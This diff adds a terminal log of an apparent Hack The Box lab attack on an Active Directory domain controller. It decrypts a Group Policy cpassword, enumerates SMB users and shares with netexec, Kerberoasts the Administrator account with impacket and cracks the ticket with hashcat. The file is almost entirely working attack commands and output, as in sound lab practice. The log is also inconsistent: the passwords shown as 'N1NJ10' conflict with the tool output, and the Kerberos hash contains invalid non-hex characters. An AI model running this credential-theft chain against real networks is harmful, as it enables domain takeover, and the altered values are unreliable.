@@ -1,0 +1,73 @@
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# cat groups.xml       
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+
+Link : https://pentestlab.blog/tag/cpassword/ , https://www.kali.org/tools/gpp-decrypt/
+                                                                                                                                       
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# gpp-decrypt edBSHOwhZLTjt/+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+N1NJ10
+                                                                                                                                       
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# netexec smb 10.10.10.100 -u SVC_TGS -d active.htb -p GPPstillStandingStrong2k18     
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+
+
+
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# netexec smb 10.10.10.100 -u SVC_TGS -d active.htb -p N1NJ10 --users
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                                                                                                 
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    445    DC               [*] Trying to dump local users with SAMRPC protocol
+SMB         10.10.10.100    445    DC               [+] Enumerated domain user(s)
+SMB         10.10.10.100    445    DC               active.htb\Administrator                  Built-in account for administering the computer/domain                                                                                                                          
+SMB         10.10.10.100    445    DC               active.htb\Guest                          Built-in account for guest access to the computer/domain                                                                                                                        
+SMB         10.10.10.100    445    DC               active.htb\krbtgt                         Key Distribution Center Service Account
+SMB         10.10.10.100    445    DC               active.htb\SVC_TGS                        
+                                                                                                                                       
+
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# netexec smb 10.10.10.100 -u SVC_TGS -d active.htb -p N1NJ10 --shares               
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    445    DC               [*] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               -----           -----------     ------
+SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    445    DC               C$                              Default share
+SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    445    DC               Replication     READ            
+SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    445    DC               Users           READ            
+
+
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save -outputfile GetUserSPNs.out
+Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-01-07 19:56:33.010143             
+
+
+
+[-] CCache file is not found. Skipping...
+
+
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# hashcat -a 0 -m 13100  GetUserSPNs.out /usr/share/wordlists/rockyou.txt    
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$202e563c3f8d8d36b502da6579f3be44$fb71cb20f76352de05558b8bc3ba3f5544e19e6b2b436c3775eb50f9571fd5c61d03f9ecd9ea19b87063df70429002b1ead90a3d0de4b38407d995e5e372aa1eb4bf8aacb4d1079539ef67c6sadef6789880485aa1799377bd9d13a296dee157057027bc5a98fbbb2888bf1cb7b9275e048ab68494567f7269e5fcb997d4f7a417b3bff615c73905e91bb024c4d02c383ad69c378836f9d56f5ba2c3cab445f8831dbb7fcb26feee82d0ca05be217ef111ebd4a83d0cb6d7ec29d40e6f6da29ff7da56edb72850b3abe67352c4361cd3ad470115fxcxc697f204369c16b41a49c6f8fafbf3e3e7f962fb26b785cd55871c859ab7a4f611b2de7a5127aa62a949e9148a5bb8771d62b08c3615c5abaa66ce2407b0ac9519751f24f06d8f57c7003db3fab9824000d79e79ad67b7c74e7d9db5ba322b67b9cee2409aa8a606e53ec857e1ce79aa5cd3bd71c4c2ef7dac60c78377ec77b4d5a39f2d13c5c2c024cdd576f789ac9fb3209e42da5e2bbvf6c7240d7a6f772a47d328419baf77bbf9db5c332d9b3000739c794d7d8512b0f75f034af8cd80ea2e2767asdca11da763df90828ad316a16a5fa06a329756e54911f999439d5bed61a0b593b818232504fab2a788f5fad98f94ad7a6b22146a4a4e2ea0c205363f1cb7a8f03c675dcab6d5950f384ae1be63c69ea284ca41f606a9cd3aaf3f8b758a0361e0ba5c6a62ad34daccb5134b8169f1083c8f03e8a09f9f3dc5815b83d0edd159a5a861da59dedefa1d0d58e4f898xzcz23dd716c2f0ecec39aa07544f2c6f255350a297d300e6e43876fdb204d5a993b7a49583d901b6b4d9d384b16e7959f0eca253898e4f0ff461dccd87f2e2264e9c2a11a3379270f190a16ff5eb00e04945a39b98114a96cb0639a7eb3b0c9caae903256f81d2125e9edf82016b0ae7a9beae9d4babf21cab34d73eeb896b86da7c8ee861596b219a04c94af8de7f88e38995f5e5e849952356757dc30cde17113a03758870de22e4169db91c7f865b400904dd0e1a44fcad46ee2cfcb39c1813145f212ac6d08b735eefd2962390fe5734c4d7390f6f5fdcce61f39667818aa9230223a4149ae0774761309865adb1fb4bcd64f6f63282b40fb0d41d07c0fc8fe36138f1852b25e4d1ba36af924be9047dfea6658291428d414d6bc07082093f0640a81c4bd30f51bb1d3f56eae30449dddf6c270483e9c7eaac1da36f188ce81b0a21c676220664b11752aa87873c0b23e398b266129d9acb9:N1NJ10
+
+
+
+
+
+
+
+
+
+
